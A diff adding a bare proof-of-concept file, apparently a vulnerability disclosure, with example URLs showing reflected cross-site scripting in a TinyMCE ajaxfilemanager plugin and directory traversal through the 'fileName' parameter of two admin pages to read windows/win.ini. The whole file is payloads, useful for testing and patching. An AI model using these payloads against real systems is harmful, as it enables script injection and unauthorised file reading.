@@ -1,0 +1,15 @@
+Cross site-scripting:
+
+http://www.example.com/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php?limit="><script>alert(1)</script> 
+
+http://www.example.com/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php?limit=5&search=1&search_folder=</script><script>alert(1)</script>Waddup Thricer! 
+
+http://www.example.com/admin/tiny_mce/plugins/ajaxfilemanager_old/ajax_get_file_listing.php?limit="><script>alert(1)</script> 
+
+http://www.example.com/admin/tiny_mce/plugins/ajaxfilemanager_old/ajax_get_file_listing.php?limit=5&search=1&search_folder=</script><script>alert(1)</script>Waddup Thricer!
+
+Directory traversal:
+
+http://www.example.com/admin/admin_blocks.php?editorChoice=none&fileName=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini 
+
+http://www.example.com/admin/admin_pages.php?editorChoice=none&fileName=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini
